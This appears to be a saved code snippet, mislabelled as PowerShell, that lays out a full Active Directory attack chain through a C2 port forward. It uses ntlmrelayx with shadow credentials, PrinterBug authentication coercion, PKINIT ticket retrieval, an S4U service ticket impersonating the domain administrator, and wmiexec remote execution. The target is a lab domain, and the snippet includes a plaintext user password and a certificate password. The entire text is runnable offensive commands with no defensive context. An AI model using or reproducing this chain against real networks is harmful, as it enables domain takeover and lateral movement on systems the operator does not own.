---
id: 8a8e320e-7372-4e51-bdb4-5f537a451a19
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:06.310724+00:00'
updated_at: '2023-04-10T20:26:05.079215+00:00'
---

# Code Snippet 8a8e320e

**Language**: ps1

```ps1
# Only for C2: Add Reverse Port Forward from 8081 to Team Server 81

# Set up ntlmrelayx to relay authentication from target workstation to DC 
proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81

# Execute printer bug to trigger authentication from target workstation 
proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file

# Get a TGT using the newly acquired certificate via PKINIT 
proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR

# Get a ST (service ticket) for the target account 
proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v

# Utilize the ST for future activity 
export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
```


